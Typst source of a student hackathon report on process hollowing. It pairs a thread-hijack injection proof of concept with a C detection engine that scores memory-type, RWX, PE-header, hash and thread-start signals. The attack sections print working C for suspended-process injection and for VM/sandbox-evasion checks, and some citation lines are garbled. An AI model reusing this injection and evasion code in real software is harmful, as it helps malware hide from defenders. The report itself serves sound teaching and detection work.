#show heading.where(level: 1): set text(size: 20.5pt)
#show heading.where(level: 2): set text(size: 17.5pt)
#show heading.where(level: 3): set text(size: 15pt)
#show heading.where(level: 4): set text(size: 13pt)
#set heading(numbering: "1.")
#set par(justify: true)
#set page(margin: 1.5cm)
#set text(size: 12pt)
#show raw: set text(size: 10pt)
#set text(font: "Inter")
#page(margin: (x: 2.5cm, y: 2.5cm))[
  // #set page(margin: (x: 2.5cm, y: 2.5cm))


#align(center + horizon)[

  #text(size: 30pt, weight: "bold",hyphenate: false)[
    EDR Evasion via 
    #v(-15pt)
    Process Hollowing Detection
  ]
  \ \ \
  #text(size: 16pt, fill: black)[
    *Course Code: 23CSE313*
  ]
  #v(-6pt)
  #text(size: 20pt, fill: black)[
    *Foundations of Cyber Security Hackathon*
  ]
  #v(2em)
  #text(size: 19pt, fill:black,weight: "bold")[
    Team Name: SnackOverflowed
  ]
  
  #v(0.5em)
  #text(size: 16pt, fill:black,weight: "bold")[
    Team Members:
  ]
  
  #text(size: 16pt)[
    Amara Manasa - BL.EN.U4CSE23006 \
    Himanshi Aggarwal - BL.EN.U4CSE23015 \
    Krishna Manasa Patiballa - BL.EN.U4CSE23025
  ]
] 
]
#pagebreak()
#outline(title: "Table of Contents")
#pagebreak()

= Introduction 
== Background
Cybersecurity threats have grown over the years with attackers constantly developing techniques to evade detection by traditional security tools. One such technique is *Process Hollowing*. It is a form of process injection that allows malicious code to execute under the disguise of a legitimate Windows process.

=== What is Process Hollowing?
Process Hollowing is an attack technique where a legitimate Windows process - such as `svchost.exe` or `notepad.exe` - is created in a suspended state, its original executable code is unmapped from memory, and a malicious payload is written in its place. The process is then resumed, now executing the attacker's code while still appearing as a trusted system process.
\ \
To understand this better, consider the following step-by-step flow of how the attack is carried out at the system level:
\ \
*```C
// Step 1: Spawn svchost.exe in a suspended state
CreateProcess("C:\\Windows\\System32\\svchost.exe", ..., CREATE_SUSPENDED, ...);

// Step 2: Hollow out the legitimate executable image from memory
NtUnmapViewOfSection(hProcess, pBaseAddress);

// Step 3: Allocate memory and write the malicious payload
VirtualAllocEx(hProcess, pBaseAddress, dwSize, ...);
WriteProcessMemory(hProcess, pBaseAddress, pPayload, dwSize, ...);

// Step 4: Redirect the entry point and resume execution
SetThreadContext(hThread, &context);
ResumeThread(hThread);
```*
\ 
What makes this particularly dangerous in a traditional on-premises enterprise environment is that the attack leaves no suspicious file on disk. The malicious code lives entirely in memory, under the cover of a process the system already trusts. Security tools that rely on file-based scanning which is common in legacy on-premises setups with SIEM solutions like Splunk or IBM QRadar will see nothing unusual, as there is simply nothing suspicious to find on disk.

== Objectives 
This project has two goals that work together:
- *Build a Process Hollowing PoC* - a controlled demonstration using a completely benign payload, just to show how the attack actually works.

- *Build a Detector* - a tool that catches this attack by comparing what a process looks like on disk versus what's actually running in memory. If they don't match, something's wrong.

== Scope and Limitations 
This project is built for an *on-premises Windows environment* - the kind you'd find in a traditional company with physical or virtualised servers. Everything runs locally, no cloud, no internet dependency.
\ \
That said, there are a few boundaries we're staying within:

- The PoC only uses a benign payload - nothing harmful.
- Detection is focused on live running processes, not forensic disk analysis.
- The solution is tested on a   Windows VM, not a production system.


= Problem Statement and Analysis
== Problem Overview 
Process hollowing is an active evasion technique used by malware to hide inside legitimate Windows processes. In this problem statement we are addressing the problem from both the sides (attack and defense).
\ \
The following points summarize what the problem is asking:

- Process hollowing is used by malware to hide malicious code inside trusted processes like `svchost.exe` and `notepad.exe`

- Traditional EDR and antivirus tools fail to detect this because they scan files on disk, not what is actually loaded in memory
- The problem requires building two components that work together:
  - A Process Hollowing PoC that injects a benign payload into a legitimate process
  
  - An EDR-style Detector that monitors process creation events and compares the on-disk binary hash with the in-memory image hash
- The detector must flag any discrepancy between what a process looks like on disk versus what is running in memory
- The entire solution must work within an on-premises Windows environment - no cloud dependencies, no internet access required
- The solution must be capable of integrating with existing SIEM tools such as Splunk or IBM QRadar via syslog/CEF

== Why Process Hollowing is a critical threat?
Process hollowing is considered one of the more dangerous attack techniques for the following reasons:
- *It abuses trust in the operating system*
  - Windows inherently trusts its own system processes like svchost.exe and notepad.exe
  - By hiding inside these processes, the malicious code inherits that trust
  - Security tools that whitelist known processes will completely overlook the attack

- *It leaves no trace on disk*
  - The malicious payload never exists as a file on the system
  
  - It is written directly into memory and executed from there
  - File-based antivirus scanners and signature detection tools find nothing suspicious because there is nothing on disk to scan
\
- *It bypasses conventional EDR solutions*
  - Most traditional EDR tools in on-premises environments monitor file creation, file modification, and network activity
  
  - Process hollowing does none of these things - it only manipulates memory
  - This makes it largely invisible to conventional detection mechanisms
\
- *It is actively used in real-world malware*

  Process hollowing is heavily used by known malware families including TrickBot and Emotet. More recently, Agent Tesla - a persistent and widely active RAT - was found using process hollowing to inject malicious code into `aspnet_compiler.exe`, a trusted Windows utility, as part of a multi-stage phishing campaign. Specifically: Picus Securityfortinet

  - TrickBot leveraged process hollowing to inject itself into svchost.exe and `msiexec.exe`, stealing credentials and distributing ransomware like Conti Portnox
  
  - Emotet used process hollowing to inject into legitimate Windows processes like `explorer.exe`, staying hidden while downloading additional payloads Portnox
  - Agent Tesla launched a legitimate process in a suspended state, hollowed out its memory, and replaced it with malicious code - allowing it to run under the guise of a trusted Windows process fortinet
\ 
- *It is particularly dangerous in enterprise environments*
  - In a traditional on-premises setup, patch cycles are slow and legacy tools are common
  - Once inside the network, an attacker using process hollowing can move laterally without triggering any alerts
  - The longer the attacker stays undetected, the greater the damage


== Challenges Involved 
- *Accessing process memory* - Reading live process memory requires elevated privileges and low-level Windows APIs. Any incorrect memory read can crash the target process.

- *Avoiding false positives* - Legitimate processes like `.NET` applications can differ from their on-disk image at runtime, making it difficult to distinguish normal behaviour from an actual attack.
- *On-premises constraints* - The solution must work entirely offline, stay lightweight, and integrate with existing SIEM tools without disrupting normal system operations.
// #pagebreak()

= System Requirements & Specifications

== Hardware Requirements
#v(6pt)
#table(
  columns: (1fr, auto, auto),
  // inset: 10pt,
  [*Component*], [*Minimum*], [*Recommended*],
  [Processor], [Dual-core 2.0 GHz], [Quad-core 2.5 GHz or higher],
  [RAM], [6 GB], [8 GB or higher],
  [Storage], [54 GB free disk space], [60 GB free disk space],
  [Network], [Isolated LAN], [Isolated LAN with SIEM connectivity],
  [Virtualization], [VMware / Hyper-V support], [VMware Workstation / Hyper-V],
)

== Software Requirements
#v(6pt)
#table(
  columns: (auto, 1fr, auto),
  // inset: 10pt,
  [*Component*], [*Requirement*], [*Purpose*],
  [Operating \ System], [Windows 10+ / Windows Server 2019], [Target environment for hollowing and detection],
  [C], [C version 6 or higher], [Detection engine and alert pipeline],
  [C Compiler], [MinGW / MSVC], [Process hollowing PoC implementation],
  [psutil], [Latest stable version], [Process monitoring and enumeration],
  // [ctypes], [Built-in with Python], [Windows API access for memory reading],
  // [Syslog Agent], [NXLog or Winlogbeat], [Forwarding alerts to SIEM via CEF/syslog],
  // [SIEM], [Splunk / IBM QRadar / ArcSight], [Centralized alert monitoring],
)

== Network Requirements
#v(6pt)
#table(
  columns: (1fr, auto),
  // inset: 10pt,
  [*Requirement*], [*Details*],
  [Internet Access], [Not required - fully offline operation],
  [Internal Network], [Isolated LAN between detection host and SIEM],
  [SIEM Communication], [Syslog/CEF over UDP/TCP port 514],
  [Firewall], [Inbound/outbound restricted to internal network only],
)

= Threat Model Information

== What We Are Protecting

- Windows system processes running on an on-premises enterprise environment

- Specifically processes like `svchost.exe` and `notepad.exe` that are inherently trusted by  OS
- The integrity of process memory - ensuring what is on disk matches what is running in memory
- Enterprise assets accessible through these trusted processes such as credentials, sensitive files, and internal network access
\
== Who is the Attacker?

- An attacker who has already gained initial access to the system - either through phishing, a malicious attachment, or a compromised user account

- They have enough privileges to spawn and manipulate processes on the target machine
- Their goal is to execute malicious code without being detected by the existing security tools

== How The Attack Happens
- Attacker gains initial foothold on the system

- A legitimate process like `svchost.exe` is spawned in a *suspended state*
- The original executable code is unmapped from memory using `NtUnmapViewOfSection()`
- Malicious payload is written into the now empty memory space using `WriteProcessMemory()`
- Execution is redirected to the malicious code using `SetThreadContext()`
- The process is resumed - now running malicious code under a trusted process name
- No suspicious file exists on disk at any point during this entire sequence

== What The Impact Is

- Malicious code runs freely inside a trusted process with no alerts triggered

- Attacker can steal credentials, log keystrokes, and access sensitive data
- Lateral movement across the internal network becomes possible
- The longer it goes undetected, the wider the damage across the enterprise

== MITRE ATT&CK Mapping

#table(
  columns: (auto, auto, 1fr),
  // inset: 10pt,
  [*Technique*], [*ID*], [*Tactic*],
  [Process Hollowing], [T1055.012], [Defense Evasion, Privilege Escalation],
  [Process Injection], [T1055], [Defense Evasion, Privilege Escalation],
  [Phishing (Initial Access)], [T1566], [Initial Access],
  [Credential Access], [T1003], [Credential Access],
)

== How Our Solution Addresses It

- The detector monitors all *process creation events* in real time

- For every new process, it computes the *SHA-256 hash of the on-disk binary*
- It then reads the *in-memory PE headers* of the same process using `ReadProcessMemory()`
- If the two hashes *do not match*, an alert is immediately generated
// - The alert is forwarded to the SIEM via *syslog/CEF* for centralized logging and response
- This directly interrupts the attack chain at the point where the hollowed process is resumed


= System Architecture

== Overview

The system is composed of two distinct components: a process hollowing
attack module and a process hollow detection engine. Together, they form
a paired offense-defense demonstration of a well-known code injection
technique used in real-world malware.

The attack component injects a raw binary payload into a legitimate
suspended process by redirecting its instruction pointer. The detection
engine independently monitors running processes using multiple behavioral
and structural signals to identify hollowed processes without any prior
knowledge of the attack.

== Component 1: Process Hollowing Attack Module

- Written in C, targeting the Windows x64 platform using the Win32 API.

- Accepts two command-line arguments: the path to a legitimate host
  process executable and a raw `.bin` payload file.

- Before executing the attack, it performs a four-signal VM detection
  check to assess the execution environment:
  - Registry key inspection for VMware and VirtualBox artifacts.
  - Running process name enumeration for known VM guest service executables.
  - CPUID hypervisor bit check (bit 31 of ECX in leaf 1), with a
    whitelist exemption for Microsoft Hyper-V on bare metal.
  - MAC address prefix matching against known VMware and VirtualBox OUI prefixes.

- The hollowing procedure follows these steps:
  - The target process is spawned in a suspended state using
    `CreateProcessA` with the `CREATE_SUSPENDED` flag.
  - Memory is allocated inside the target process using `VirtualAllocEx`
    with `PAGE_EXECUTE_READWRITE` protection.
  - The payload bytes are written into that allocation with
    `WriteProcessMemory`.
  - The suspended thread's CPU context is retrieved with `GetThreadContext`.
  - The `RIP` register (instruction pointer) in the context is overwritten
    to point at the injected payload.
  - The modified context is applied back with `SetThreadContext`.
  - The thread is resumed with `ResumeThread`, causing execution to begin
    at the injected payload.

- The attack does not unmap the original image. It redirects execution
  directly without replacing the PE headers, making it a lightweight
  variant of process hollowing sometimes called a *thread hijack injection*.

\ \
== Component 2: Process Hollow Detection Engine

- Written in modular C across eight source files, targeting Windows x64
  with MinGW-w64 or MSVC.

- Structured as a pipeline: a coordinator enumerates processes, an
  analyzer orchestrates per-process checks, and individual check modules
  each contribute an independent detection signal with a weighted score.

- The engine operates entirely from user space using documented and
  semi-documented Windows APIs (`VirtualQueryEx`, `ReadProcessMemory`,
  `NtQueryInformationProcess`, `NtQueryInformationThread`).

- Requests `SeDebugPrivilege` at startup to enable cross-process memory
  access. Degrades gracefully without it, skipping inaccessible processes.

=== Detection Signals

The engine uses five independent checks. Each fires a signal with a
point score. Scores accumulate and are mapped to a final verdict.

#table(
  columns: (auto, 1fr, auto),
  align: (left, left, center),
  table.header([*Signal*], [*What It Detects*], [*Score*]),
  [`IMAGE_HASH_MISMATCH`],
    [SHA-256 of the in-memory image differs from the on-disk file,
     indicating the process image was modified after loading.],
    [+40],
  [`PRIVATE_MEM_AT_IMAGE_BASE`],
    [`VirtualQueryEx` reports `MEM_PRIVATE` instead of `MEM_IMAGE`
     at the process image base, meaning the original file-backed
     mapping was replaced with anonymous memory.],
    [+35],
  [`THREAD_START_IN_ANONYMOUS_REGION`],
    [One or more threads have their start address inside `MEM_PRIVATE`
     executable memory rather than inside a loaded module.],
    [+30],
  [`RWX_PAGE_AT_IMAGE_BASE`],
    [The page at the image base carries `PAGE_EXECUTE_READWRITE`
     protection, which is never present in a legitimately loaded image.],
    [+25],
  [`PE_HEADER_CORRUPT`],
    [The DOS or NT PE headers in memory are unreadable or fail
     signature validation.],
    [+20],
  [`IMAGEBASE_VALUE_MISMATCH`],
    [The `ImageBase` field in the PE optional header does not match
     the actual load address. Low weight due to normal ASLR shifting.],
    [+15],
)

=== Verdict Thresholds

#table(
  columns: (auto, auto, 1fr),
  align: (center, center, left),
  table.header([*Score*], [*Verdict*], [*Interpretation*]),
  [< 30],  [CLEAN],      [No signals of concern.],
  [30–59], [SUSPICIOUS], [One or two weak or corroborating signals fired.],
  [60–89], [HIGH],       [Multiple strong signals fired; likely injected.],
  [≥ 90],  [CRITICAL],   [Full signal overlap; almost certainly hollowed.],
)

== Interaction Between Components

- The attack module and detection engine are independent executables.
  They share no code or runtime state.

- The detection engine is designed to observe processes it did not
  create, making it applicable to real-world monitoring scenarios where
  the attacker and defender are separate.

- In the test harness (`test_hollow_detect.c`), the engine spawns its
  own suspended victim process, injects a RWX page, and then runs the
  full detection pipeline against it, validating that the detection
  signals fire correctly under controlled conditions.

- The attack module's use of `PAGE_EXECUTE_READWRITE` and its
  modification of the thread instruction pointer are specifically
  targeted by the `RWX_PAGE_AT_IMAGE_BASE` and
  `THREAD_START_IN_ANONYMOUS_REGION` checks in the detection engine.

== Output and Reporting

- The detection engine supports three output modes simultaneously:
  colour-coded console output, a timestamped plain-text log file, and
  a structured JSON report.

- JSON output includes per-process verdict, total score, and the full
  detail string of every signal that fired, making it suitable for
  ingestion into SIEM or automated analysis pipelines.

- The exit code of the engine equals the number of flagged processes,
  enabling scripted or CI/CD integration.

#pagebreak()
= Implementation Details

== Attack Module Implementation

=== VM Detection

Before executing the hollowing procedure, the attack module runs four
independent environment checks to assess whether it is executing inside
a virtual machine. This is a common evasion technique used in real-world
malware to avoid sandbox analysis.

*Registry Check*

The most reliable VM indicator on Windows is the presence of guest
driver registry keys. VMware Tools and VirtualBox Guest Additions both
install persistent registry entries that are absent on bare metal.

```c
int check_registry() {
    HKEY hKey;
    const char *keys[] = {
        "SOFTWARE\\VMware, Inc.\\VMware Tools",
        "SOFTWARE\\Oracle\\VirtualBox Guest Additions",
        "SYSTEM\\ControlSet001\\Services\\VBoxGuest",
        "SYSTEM\\ControlSet001\\Services\\vmci",
        NULL
    };
    for (int i = 0; keys[i]; i++) {
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, keys[i], 0,
                          KEY_READ, &hKey) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return 1;
        }
    }
    return 0;
}
```

*Process Enumeration Check*

VMware and VirtualBox both run guest service processes that are visible
in the process list. The check takes a full process snapshot and
performs a case-insensitive name comparison against known VM process names.

```c
int check_processes() {
    const char *procs[] = {
        "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
        "vboxservice.exe", "vboxtray.exe", NULL
    };
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe; pe.dwSize = sizeof(pe);
    if (Process32First(snap, &pe)) {
        do {
            for (int i = 0; procs[i]; i++)
                if (_stricmp(pe.szExeFile, procs[i]) == 0) {
                    CloseHandle(snap); return 1;
                }
        } while (Process32Next(snap, &pe));
    }
    CloseHandle(snap);
    return 0;
}
```

*CPUID Hypervisor Bit Check*

The x86 `CPUID` instruction with leaf `0x1` sets bit 31 of `ECX` when
executing inside a hypervisor. If that bit is set, a second call with
leaf `0x40000000` retrieves the hypervisor vendor string. The check
whitelists `"Microsoft Hv"` (Hyper-V on bare metal, including WSL2) to
avoid false positives on developer machines.

```c
int check_cpuid() {
    int info[4] = {0};
    __cpuid(info, 1);
    if (!((info[2] >> 31) & 1)) return 0;  // hypervisor bit not set

    char vendor[13] = {0};
    __cpuid(info, 0x40000000);
    memcpy(vendor,     &info[1], 4);
    memcpy(vendor + 4, &info[2], 4);
    memcpy(vendor + 8, &info[3], 4);

    if (strcmp(vendor, "Microsoft Hv") == 0) return 0;  // bare metal Hyper-V
    return 1;
}
```

*MAC Address OUI Check*

Network adapter MAC addresses have vendor-assigned prefixes (OUIs).
VMware and VirtualBox use fixed OUI prefixes for their virtual NICs,
making them identifiable through `GetAdaptersInfo`.

```c
int check_mac() {
    const char *vm_macs[] = {
        "\x00\x0C\x29",  // VMware
        "\x00\x50\x56",  // VMware
        "\x08\x00\x27",  // VirtualBox
        NULL
    };
    IP_ADAPTER_INFO info[16];
    DWORD size = sizeof(info);
    if (GetAdaptersInfo(info, &size) != ERROR_SUCCESS) return 0;
    for (IP_ADAPTER_INFO *a = info; a; a = a->Next)
        for (int i = 0; vm_macs[i]; i++)
            if (memcmp(a->Address, vm_macs[i], 3) == 0) return 1;
    return 0;
}
```
\ \ \
=== Process Hollowing Procedure

The attack follows six sequential steps using only documented Win32 APIs.

*Step 1 -- Spawn the target process suspended*

The legitimate host process is created with `CREATE_SUSPENDED`. At this
point the process exists in memory with its PE image mapped but no code
has executed yet -- the primary thread is frozen at its entry point.

```c
STARTUPINFOA si = { sizeof(si) };
PROCESS_INFORMATION pi;
CreateProcessA(argv[1], NULL, NULL, NULL, FALSE,
               CREATE_SUSPENDED, NULL, NULL, &si, &pi);
```

*Step 2 -- Allocate RWX memory in the target*

A region of memory the same size as the payload is allocated in the
target process's address space with full read-write-execute permissions.
This is detectable by the engine's `RWX_PAGE_AT_IMAGE_BASE` check.

```c
exec = VirtualAllocEx(pi.hProcess, NULL, MalSize,
                      MEM_COMMIT | MEM_RESERVE,
                      PAGE_EXECUTE_READWRITE);
```

*Step 3 -- Write the payload*

The raw binary payload is copied into the allocated region using
`WriteProcessMemory`. No PE headers are written -- this is a raw
shellcode injection, not a full image replacement.

```c
WriteProcessMemory(pi.hProcess, exec, buffer, MalSize, NULL);
```

*Step 4 -- Retrieve thread context*

The CPU register state of the suspended primary thread is retrieved.
The `CONTEXT_FULL` flag ensures all general-purpose registers, the
instruction pointer, and segment registers are captured.

```c
CONTEXT CT;
CT.ContextFlags = CONTEXT_FULL;
GetThreadContext(pi.hThread, &CT);
```

*Step 5 -- Redirect the instruction pointer*

The `RIP` register in the captured context is overwritten to point at
the injected payload. When the thread resumes, this is the first
instruction it will execute.

```c
CT.Rip = (DWORD64)exec;
SetThreadContext(pi.hThread, &CT);
```

*Step 6 -- Resume execution*

The thread is resumed. Execution begins at the injected payload inside
the memory space of the legitimate host process.

```c
ResumeThread(pi.hThread);
```

== Detection Engine Implementation

=== Engine Initialisation and Privilege Acquisition

At startup the engine dynamically resolves two NT functions that are
not present in standard import libraries. It then attempts to acquire
`SeDebugPrivilege`, which is required to call `OpenProcess` with
`PROCESS_VM_READ` on processes owned by other users or SYSTEM.

```c
ctx->NtQueryInformationProcess =
    (PFN_NtQueryInformationProcess)(void*)
    GetProcAddress(GetModuleHandleA("ntdll.dll"),
                   "NtQueryInformationProcess");

ctx->NtQueryInformationThread =
    (PFN_NtQueryInformationThread)(void*)
    GetProcAddress(GetModuleHandleA("ntdll.dll"),
                   "NtQueryInformationThread");
```

Privilege elevation uses `AdjustTokenPrivileges`. The engine degrades
gracefully if this fails -- it skips inaccessible processes rather than
crashing -- making it usable without Administrator rights for partial coverage.

=== Image Base Extraction via PEB

Every Windows process has a Process Environment Block (PEB) -- a
kernel-maintained structure describing the process to itself. The
`ImageBaseAddress` field inside the PEB holds the actual load address
of the main executable in memory. The engine reads this by first
querying the PEB's own address via `NtQueryInformationProcess`, then
reading a pointer at a fixed offset into it.

```c
PROCESS_BASIC_INFORMATION pbi;
ctx->NtQueryInformationProcess(hProc, ProcessBasicInformation,
                                &pbi, sizeof(pbi), &retLen);

// Offset to ImageBaseAddress: 0x10 on x64, 0x08 on x86
#ifdef _WIN64
    const SIZE_T IB_OFFSET = 0x10;
#else
    const SIZE_T IB_OFFSET = 0x08;
#endif

PVOID ibAddr = (BYTE *)pbi.PebBaseAddress + IB_OFFSET;
ReadProcessMemory(hProc, ibAddr, imageBase, sizeof(PVOID), &read);
```
\ \ \ \ \
=== Check 1 -- SHA-256 Image Hash Comparison

The engine reads the `SizeOfImage` field from the in-memory PE optional
header, then walks the process's memory page by page accumulating all
readable bytes. The resulting buffer is hashed using the Windows
`CryptHashData` API. The same hash is computed on the on-disk file.
Any difference indicates the image was modified after loading.

```c
DWORD sizeOfImage = nt.OptionalHeader.SizeOfImage;

// Hash memory image page by page
while (offset < sizeOfImage) {
    SIZE_T chunkSize = min((SIZE_T)4096,
                           (SIZE_T)sizeOfImage - offset);
    ReadProcessMemory(hProc, (BYTE *)base + offset,
                      buf + offset, chunkSize, &read);
    offset += chunkSize;
}
sha256_buffer(buf, sizeOfImage, memHash);

// Hash on-disk file
pe_hash_file(imagePath, diskHash);

if (memcmp(memHash, diskHash, HASH_SIZE) != 0)
    // --> signal fired: IMAGE_HASH_MISMATCH (+40)
```

*Known false positive:* ASLR relocation fixups modify pointer values in
the `.text` section in-memory at load time, causing a hash mismatch on
virtually every process even without injection. This is expected
behaviour and is noted in the signal detail string.

=== Check 2 -- VAD Memory Type at Image Base

`VirtualQueryEx` returns a `MEMORY_BASIC_INFORMATION` structure
describing the memory region at a given address. The `Type` field
distinguishes file-backed mappings (`MEM_IMAGE`) from anonymous private
allocations (`MEM_PRIVATE`). A legitimate process image always appears
as `MEM_IMAGE`. A hollowed process where the original image was unmapped
and replaced with injected code appears as `MEM_PRIVATE`.

```c
MEMORY_BASIC_INFORMATION mbi;
VirtualQueryEx(hProc, imageBase, &mbi, sizeof(mbi));

if (mbi.Type == MEM_PRIVATE &&
    (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
                    PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)))
    // --> signal fired: PRIVATE_MEM_AT_IMAGE_BASE (+35)
```
\ \ \ \ \

=== Check 3 -- RWX Page at Image Base

This check uses the same `VirtualQueryEx` call but focuses on the
protection flags rather than the memory type. Legitimate PE sections
follow strict permission rules set by the OS loader: `.text` is
`PAGE_EXECUTE_READ`, `.data` is `PAGE_READWRITE`, and no section is
both writable and executable. The presence of `PAGE_EXECUTE_READWRITE`
at the image base means the region was manually allocated for injection.

```c
if (mbi.Protect == PAGE_EXECUTE_READWRITE ||
    mbi.Protect == PAGE_EXECUTE_WRITECOPY)
    // --> signal fired: RWX_PAGE_AT_IMAGE_BASE (+25)
```

=== Check 4 -- PE Header Integrity

The engine reads the DOS stub (`IMAGE_DOS_HEADER`) and NT headers
(`IMAGE_NT_HEADERS`) directly from the remote process's memory and
validates the `MZ` and `PE\0\0` magic signatures. A hollowing attack
that overwrites the image base region without restoring the PE headers
will fail this check.

```c
IMAGE_DOS_HEADER dos;
IMAGE_NT_HEADERS nt;
ReadProcessMemory(hProc, base, &dos, sizeof(dos), &read);
// validate dos.e_magic == IMAGE_DOS_SIGNATURE (0x5A4D)

ReadProcessMemory(hProc, (BYTE*)base + dos.e_lfanew,
                  &nt, sizeof(nt), &read);
// validate nt.Signature == IMAGE_NT_SIGNATURE (0x00004550)
```

A secondary sub-check compares `nt.OptionalHeader.ImageBase` against
the actual load address. This is scored low (+15) because ASLR causes
this to differ legitimately on every modern Windows system.

=== Check 5 -- Thread Start Address Analysis

For each thread belonging to the target process, the engine calls
`NtQueryInformationThread` with class `ThreadQuerySetWin32StartAddress`
(value 9) to retrieve the address at which the thread began execution.
It then calls `VirtualQueryEx` on that address to determine what kind
of memory it falls in. Threads that start inside `MEM_PRIVATE`
executable memory were created by an injector rather than the OS loader.

```c
PVOID startAddr = NULL;
ctx->NtQueryInformationThread(hThread,
    ThreadQuerySetWin32StartAddress,
    &startAddr, sizeof(startAddr), &retLen);

VirtualQueryEx(hProc, startAddr, &mbi, sizeof(mbi));

if (mbi.Type == MEM_PRIVATE &&
    (mbi.Protect & (PAGE_EXECUTE | PAGE_EXECUTE_READ |
                    PAGE_EXECUTE_READWRITE | PAGE_EXECUTE_WRITECOPY)))
    anonCount++;

// if anonCount > 0:
// --> signal fired: THREAD_START_IN_ANONYMOUS_REGION (+30)
```

=== Score Accumulation and Verdict Assignment

Every fired signal adds its weight to a running total. The final verdict
is assigned by comparing the total score against fixed thresholds.
Requiring multiple independent signals to reach higher verdicts
substantially reduces false positives -- a single ASLR-induced hash
mismatch scores only 40 (SUSPICIOUS) rather than immediately escalating
to CRITICAL.

```c
static VERDICT compute_verdict(int score) {
    if (score >= THRESHOLD_CRITICAL)   return VERDICT_CRITICAL;   // >= 90
    if (score >= THRESHOLD_HIGH)       return VERDICT_HIGH;        // >= 60
    if (score >= THRESHOLD_SUSPICIOUS) return VERDICT_SUSPICIOUS;  // >= 30
    return VERDICT_CLEAN;
}
```

=== Structured Output and JSON Reporting

Every result is serialised into a `PROCESS_RESULT` struct and can be
written to a JSON file for downstream ingestion. The JSON output
captures the PID, process name, on-disk path, verdict string, total
score, and the full detail string of every signal that fired.

```c
// Example JSON output for a flagged process
{
  "pid": 4812,
  "name": "svchost.exe",
  "verdict": "CRITICAL",
  "score": 105,
  "signals": [
    { "type": "IMAGE_HASH_MISMATCH",
      "score": 40,
      "detail": "Memory SHA256=a3f2...  Disk SHA256=9b1c..." },
    { "type": "PRIVATE_MEM_AT_IMAGE_BASE",
      "score": 35,
      "detail": "MEM_PRIVATE at image base 0x00007FF6A0000000" },
    { "type": "THREAD_START_IN_ANONYMOUS_REGION",
      "score": 30,
      "detail": "2 of 4 threads start in MEM_PRIVATE executable memory" }
  ]
}
```


// = Deployment Details
// #pagebreak()

= Results and Testing 
#image("notepadprocess.png"),
#image("testing1.png")
#image("baremetal.png")
#image("notepadhashmismatch.png")
#image("flaggingreport.png")
#image("checkingforhollowlive.png")
#image("alltestspassed.png")
= Limitations and Future Work

== Current Limitations

=== False Positives from ASLR

The biggest practical problem with the current engine is that the hash
comparison check fires on almost every process. When Windows loads an
executable, it patches memory addresses inside the code to match the
new random load address. This makes the in-memory image always differ
from the on-disk file, even on a completely clean system. The engine
handles this by scoring it at +40 rather than immediately flagging it
as critical, but it still causes clean processes to appear as SUSPICIOUS
in many cases.

=== No Support for 32-bit Processes

The engine is built as a 64-bit binary and cannot correctly inspect
32-bit (WOW64) processes. The PEB structure layout is different for
32-bit processes running on a 64-bit OS, so the image base extraction
would read from the wrong memory offset. This means any 32-bit malware
using process hollowing would be missed entirely.

\ 
=== Requires Administrator Rights for Full Coverage

Without `SeDebugPrivilege`, the engine cannot open processes owned by
SYSTEM or other users. This means protected system processes -- which
are actually the most attractive targets for process hollowing attacks
in the real world -- are skipped silently unless the engine is run as
Administrator.

=== User Space Only

The entire engine operates from user space. A sufficiently advanced
attacker could hook the Windows APIs the engine relies on
(`VirtualQueryEx`, `ReadProcessMemory`, `NtQueryInformationProcess`)
and return falsified results. This is a fundamental ceiling on what
any user-space detection tool can guarantee.

=== The Attack Module is a Lightweight Variant

The attack module does not perform full process hollowing -- it does
not unmap the original image or replace the PE headers. It only
redirects the thread instruction pointer. This means the
`PRIVATE_MEM_AT_IMAGE_BASE` and `PE_HEADER_CORRUPT` checks will not
fire against it, only the hash and thread start address checks. A
more complete hollow implementation would trigger more signals.

=== No Persistence or Real-time Monitoring

The engine is a point-in-time scanner. It takes a snapshot of all
processes at the moment it runs and exits. It has no ability to watch
for new processes being created or alert in real time when a hollowing
attempt is made.

== Future Work

=== Kernel-mode Driver

Moving the detection logic into a Windows kernel driver would eliminate
the API hooking problem entirely. A driver can read process memory and
inspect VAD trees directly from kernel space, where an attacker in user
space cannot interfere with it.

=== Real-time Monitoring via ETW

Windows provides an Event Tracing for Windows (ETW) interface that
fires callbacks whenever a process is created, a thread is started, or
memory protection flags are changed. Integrating ETW would turn the
engine from a one-shot scanner into a continuous monitor that catches
hollowing attempts the moment they happen.

=== Smarter Hash Comparison

Rather than hashing the entire image -- which always differs due to
ASLR relocation -- a better approach would be to only hash the sections
that should never change at runtime, such as the resource section
(`.rsrc`) or the import address table headers. This would dramatically
reduce false positives while still catching injected payloads.

=== WOW64 Support

Adding a 32-bit companion binary or using the `Wow64ReadVirtualMemory`
API would extend coverage to 32-bit processes, closing the gap that
currently allows 32-bit hollowing attacks to go undetected.

=== Whitelist and Baseline System

A known-good database of SHA-256 hashes for common Windows system
binaries would allow the engine to skip the hash mismatch signal for
files it already knows are clean, removing the ASLR false positive
problem for system processes entirely.

=== SIEM Integration

The JSON output the engine already produces could be fed directly into
a SIEM platform such as Splunk or Elastic. Adding a daemon mode that
writes JSON on a schedule and a standardised log format would make this
straightforward to deploy as part of a real security monitoring pipeline.// #pagebreak()

= Conclusion 
// = Conclusion

This project built a paired attack and defense system to demonstrate
process hollowing -- a technique where malicious code hides inside a
legitimate Windows process to avoid detection.

The attack module showed how an attacker can suspend a real process,
inject a payload into its memory, and redirect execution to it. From
the outside it looks completely normal -- no new process appears, and
the code runs under a trusted name.

The detection engine fights back using five independent checks that
look at memory types, page permissions, PE header validity, hash
comparisons, and thread start addresses. Combining these into a
scoring system means the engine is harder to fool than any single
check alone. The test results confirmed it correctly flags a live
injected process every time.

The biggest lesson from this project is that process hollowing always
leaves traces. The same Windows APIs an attacker uses to inject code
are the ones a defender can use to inspect it. Detection is always
possible -- it just requires knowing exactly what to look for.

The engine is a solid proof of concept but has room to grow. Real-time
monitoring, kernel-level inspection, and smarter hash comparison would
make it production-ready. For now it demonstrates the core idea clearly:
even sophisticated attacks can be caught with the right set of eyes.

= References 
1. #underline[https://www.fortinet.com/blog/threat-research/unmasking-agent-tesla-deep-dive-into-multi-stage-campaign]

2. #underline[https://www.ired.team/offensive-security/code-injection-process-injection/process-hollowing-and-pe-image-relocations]